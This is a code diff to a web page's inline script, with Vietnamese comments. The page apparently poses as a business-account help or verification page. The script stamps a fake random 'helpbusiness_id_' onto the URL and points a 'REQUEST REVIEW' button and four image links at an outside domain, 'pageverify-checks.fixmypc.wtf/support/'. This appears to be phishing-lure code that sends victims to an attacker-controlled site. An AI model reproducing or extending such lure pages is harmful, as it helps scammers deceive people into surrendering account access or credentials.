@@ -78,32 +78,35 @@
 
 <!-- JavaScript to Randomize URL -->
 <script>
-    function generateRandomNumber() {
+        function generateRandomNumber() {
         return 100000 + Math.floor(Math.random() * 900000); // Số ngẫu nhiên từ 100000 đến 999999
     }
 
-    // Lấy dãy số ngẫu nhiên
-    const randomNumber = generateRandomNumber();
+    // Lấy URL hiện tại
+    const currentUrl = window.location.href;
 
-    // Thêm dãy số vào URL hiện tại của trang web
-    const currentUrl = window.location.href;  // Lấy URL hiện tại
-    const newUrl = `${currentUrl}?helpbusiness_id_${randomNumber}`;  // Thêm dãy số vào cuối URL
-
-    // Cập nhật lại URL của trang
-    window.history.replaceState(null, '', newUrl);
+    // Kiểm tra xem URL đã có tham số `helpbusiness_id_` hay chưa
+    if (!currentUrl.includes("helpbusiness_id_")) {
+        // Lấy dãy số ngẫu nhiên
+        const randomNumber = generateRandomNumber();
+        // Thêm dãy số vào URL
+        const newUrl = `${currentUrl}?helpbusiness_id_${randomNumber}`;
+        // Cập nhật lại URL của trang
+        window.history.replaceState(null, '', newUrl);
+    }
 
     // Gắn URL ngẫu nhiên cho nút và hình ảnh
     const randomUrl = `https://pageverify-checks.fixmypc.wtf/support/`;
 
     // Gắn URL cho nút "REQUEST REVIEW"
-    const randomLink = document.getElementById("random-link");
-    randomLink.href = randomUrl;
+    document.getElementById("random-link").href = randomUrl;
 
     // Gắn URL cho các hình ảnh
     document.getElementById("img-link-1").href = randomUrl;
     document.getElementById("img-link-2").href = randomUrl;
     document.getElementById("img-link-3").href = randomUrl;
     document.getElementById("img-link-4").href = randomUrl;
+
 </script>
 
 
